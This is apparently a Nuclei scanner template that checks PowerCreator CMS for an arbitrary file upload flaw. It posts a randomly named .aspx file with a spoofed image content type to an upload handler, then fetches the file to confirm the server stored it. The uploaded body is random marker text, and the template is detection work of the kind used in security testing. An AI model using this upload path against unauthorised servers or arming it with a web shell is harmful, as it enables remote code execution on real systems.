id: powercreator-cms-file-upload
info:
  name: PowerCreator CMS Arbitrary File Upload
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Exploits an arbitrary file upload vulnerability in PowerCreator CMS allowing an attacker to upload and execute a malicious .aspx file.

variables:
  rand: "{{rand_int(1000, 9999)}}"
  content: "{{rand_text_alphanumeric(8)}}"
  randname: "{{rand_text_alpha(4)}}"

http:
  - id: r0
    method: POST
    path:
      - "/upload/UploadResourcePic.ashx?ResourceID={{rand}}"
    headers:
      Content-Type: multipart/form-data; boundary=---------------------------20873900192357278038549710136
    body: |
      -----------------------------20873900192357278038549710136
      Content-Disposition: form-data; name="file1"; filename="{{randname}}.aspx"
      Content-Type: image/jpeg

      {{content}}
      -----------------------------20873900192357278038549710136--
    extractors:
      - type: regex
        internal: true
        name: path
        group: 1
        regex:
          - "(?P<path>.+?)\\.ASPX"
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "\\.ASPX"

  - id: r1
    method: GET
    path:
      - "/ResourcePic/{{path}}.ASPX"
    matchers:
      - type: status
        status:
          - 200
